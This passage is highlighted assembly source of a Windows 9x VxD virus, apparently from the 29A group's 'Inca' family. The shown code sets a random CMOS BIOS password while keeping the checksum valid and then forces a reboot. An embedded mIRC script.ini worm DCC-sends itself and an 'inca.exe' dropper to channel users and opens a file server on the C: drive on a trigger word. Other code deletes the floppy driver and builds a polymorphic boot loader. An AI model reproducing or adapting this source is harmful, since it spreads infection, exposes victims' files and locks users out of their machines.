           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0050h</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rndpsw</span><span class="sc0">                         </span><span class="sc1">;for ask always, and correcting</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">                         </span><span class="sc1">;the checksum, of course :)</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rndpsw</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7dh</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7eh</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
     </span><span class="sc5">hehehe</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">sti</span><span class="sc0">                                 </span><span class="sc1">;reboot machine, so the user</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">                        </span><span class="sc1">;notice the payload soon ;)</span><span class="sc0">
           </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">hehehe</span><span class="sc0">
     </span><span class="sc5">read</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7fh</span><span class="sc0">                         </span><span class="sc1">;CMOS read</span><span class="sc0">
           </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
           </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">write</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7fh</span><span class="sc0">                         </span><span class="sc1">;CMOS write</span><span class="sc0">
           </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
           </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">rndpsw</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;make random password but</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                          </span><span class="sc1">;mantain correct checksum</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">step1</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                          </span><span class="sc1">;checksum</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">step2</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;checksum</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">award</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AWARD'</span><span class="sc0">
       </span><span class="sc5">KCodeSize</span><span class="sc0"> </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">KCode</span><span class="sc0">


       </span><span class="sc5">ScriptSize</span><span class="sc0"> </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc5">ScriptIniEnd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ScriptIni</span><span class="sc0">
     </span><span class="sc5">ScriptIni</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc4">[</span><span class="sc5">script</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc5">n0</span><span class="sc4">=</span><span class="sc5">run</span><span class="sc0"> </span><span class="sc5">$mircdirinca.exe</span><span class="sc0">                 </span><span class="sc1">;run virus dropper when mIRC</span><span class="sc0">
                                               </span><span class="sc1">;start</span><span class="sc0">
       </span><span class="sc5">n1</span><span class="sc4">=</span><span class="sc5">ON</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">:</span><span class="sc5">JOIN</span><span class="sc4">:</span><span class="sc0">#</span><span class="sc4">:</span><span class="sc0">{ </span><span class="sc4">/</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0"> </span><span class="sc5">$nick</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc5">$me</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> { </span><span class="sc5">halt</span><span class="sc0"> }
       </span><span class="sc5">n2</span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">dcc</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0"> </span><span class="sc5">$nick</span><span class="sc0"> </span><span class="sc5">$mircdirscript.ini</span><span class="sc0">
       </span><span class="sc5">n3</span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">dcc</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0"> </span><span class="sc5">$nick</span><span class="sc0"> </span><span class="sc5">$mircdirinca.exe</span><span class="sc0">
       </span><span class="sc5">n4</span><span class="sc4">=</span><span class="sc0">}
       </span><span class="sc5">n5</span><span class="sc4">=</span><span class="sc5">ON</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">:</span><span class="sc5">PART</span><span class="sc4">:</span><span class="sc0">#</span><span class="sc4">:</span><span class="sc0">{ </span><span class="sc4">/</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0"> </span><span class="sc5">$nick</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc5">$me</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> { </span><span class="sc5">halt</span><span class="sc0"> }
       </span><span class="sc5">n6</span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">dcc</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0"> </span><span class="sc5">$nick</span><span class="sc0"> </span><span class="sc5">$mircdirscript.ini</span><span class="sc0">
       </span><span class="sc5">n7</span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">dcc</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0"> </span><span class="sc5">$nick</span><span class="sc0"> </span><span class="sc5">$mircdirinca.exe</span><span class="sc0">
       </span><span class="sc5">n8</span><span class="sc4">=</span><span class="sc0">}                                    </span><span class="sc1">;on /JOIN and /LEAVE, we send</span><span class="sc0">
                                               </span><span class="sc1">;the script and the virus</span><span class="sc0">
                                               </span><span class="sc1">;dropper to the target</span><span class="sc0">
       </span><span class="sc5">n9</span><span class="sc4">=</span><span class="sc5">ON</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">:</span><span class="sc5">TEXT</span><span class="sc4">:*</span><span class="sc5">el_inca</span><span class="sc4">*:</span><span class="sc0">#</span><span class="sc4">:/</span><span class="sc5">run</span><span class="sc0"> </span><span class="sc5">$mircdirrevenge.com</span><span class="sc0">
                                               </span><span class="sc1">;when this is said, the souls</span><span class="sc0">
                                               </span><span class="sc1">;of thousands of dead Inca</span><span class="sc0">
                                               </span><span class="sc1">;indians come to take revenge</span><span class="sc0">
       </span><span class="sc5">n10</span><span class="sc4">=</span><span class="sc5">ON</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">:</span><span class="sc5">TEXT</span><span class="sc4">:*</span><span class="sc5">ancev</span><span class="sc4">*:</span><span class="sc0">#</span><span class="sc4">:/</span><span class="sc5">fserve</span><span class="sc0"> </span><span class="sc5">$nick</span><span class="sc0"> </span><span class="sc2">666</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:\
</span><span class="sc0">                                               </span><span class="sc1">;just for the case that the</span><span class="sc0">
                                               </span><span class="sc1">;host have something i want ;)</span><span class="sc0">
       </span><span class="sc5">n11</span><span class="sc4">=</span><span class="sc5">ON</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">:</span><span class="sc5">TEXT</span><span class="sc4">:*</span><span class="sc5">_29A_</span><span class="sc4">*:</span><span class="sc0">#</span><span class="sc4">:/</span><span class="sc5">quit</span><span class="sc0">
                                               </span><span class="sc1">;everybody bow in awe before</span><span class="sc0">
                                               </span><span class="sc1">;our power!!</span><span class="sc0">
     </span><span class="sc5">ScriptIniEnd</span><span class="sc0"> </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0">

       </span><span class="sc5">ScriptName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SCRIPT.INI'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

       </span><span class="sc5">ScriptName2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SCRIPT.OLD'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

       </span><span class="sc5">MircIni</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MIRC.INI'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

       </span><span class="sc5">InsertSize</span><span class="sc0"> </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc5">IMircIniEnd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IMircIni</span><span class="sc0">
     </span><span class="sc5">IMircIni</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">                               </span><span class="sc1">;this is inserted in MIRC.INI</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[fileserver]'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">               </span><span class="sc1">;to avoid warnings when we</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Warning=Off'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">                </span><span class="sc1">;start the /FSERVER</span><span class="sc0">
     </span><span class="sc5">IMircIniEnd</span><span class="sc0"> </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0">



</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">FONO98_Device_Init</span><span class="sc0">
         </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">Close_Boot_Log</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OurFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">UpDown</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Compressed</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FloppyInUse</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">;init flags</span><span class="sc0">
         </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
         </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
         </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">seed</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;init rnd seed</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ScriptIni</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ScriptSize</span><span class="sc0">
  </span><span class="sc5">DecriptScript</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">
         </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                                </span><span class="sc1">;decript viral script.ini</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">DecriptScript</span><span class="sc0">
  </span><span class="sc5">GetPathToVMM</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">Get_Exec_Path</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ErrorDone</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                           </span><span class="sc1">;find end of string</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">VMM32Path</span><span class="sc0">
         </span><span class="sc6">pushad</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                             </span><span class="sc1">;copy it to our buffer</span><span class="sc0">
         </span><span class="sc6">std</span><span class="sc0">                                   </span><span class="sc1">;(next time i will use</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                               </span><span class="sc1">;GetSystemPath, i swear ;)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">"\"
</span><span class="sc0">         </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
  </span><span class="sc5">DeleteFloppyVxD</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pushad</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">FloppyVxD</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SizeFloppyVxDName</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                             </span><span class="sc1">;HSFLOP.PDR</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc4">+</span><span class="sc5">SET_ATTRIBUTES</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">VMM32Path</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">           </span><span class="sc1">;kill attribs and delete the</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_DELETEFILE</span><span class="sc0">                </span><span class="sc1">;32bit driver for floppies</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">popad</span><span class="sc0">
  </span><span class="sc5">CopyMyVxDName</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">MyVxDName</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SizeVxDName</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                             </span><span class="sc1">;append viral vxd and path</span><span class="sc0">
         </span><span class="sc6">popad</span><span class="sc0">
  </span><span class="sc5">ReadVxDAndCompress</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ff00h</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ErrorDone</span><span class="sc0">                          </span><span class="sc1">;autopen vxd</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ErrorDone</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxDOriginalSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxDSize2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AllocMemory</span><span class="sc0">                      </span><span class="sc1">;alloc some memory and read</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorDone</span><span class="sc0">                          </span><span class="sc1">;our vxd to this buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferOneHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_READFILE</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">NoError</span><span class="sc0">
  </span><span class="sc5">ErrorFreeBlock</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferOneHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeAllocMemory</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ErrorDone</span><span class="sc0">
  </span><span class="sc5">NoError</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">512</span><span class="sc4">*</span><span class="sc2">18</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AllocMemory</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorDone</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferTwoHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferOneHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxDCompressedBuffer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Compress32</span><span class="sc0">                       </span><span class="sc1">;compress VXD using a simple</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxDCompressSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">             </span><span class="sc1">;RLE scheme</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxDCompressedSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxDSize1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferOneHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">maq</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gldr</span><span class="sc0">                             </span><span class="sc1">;make poly boot (16bit)</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
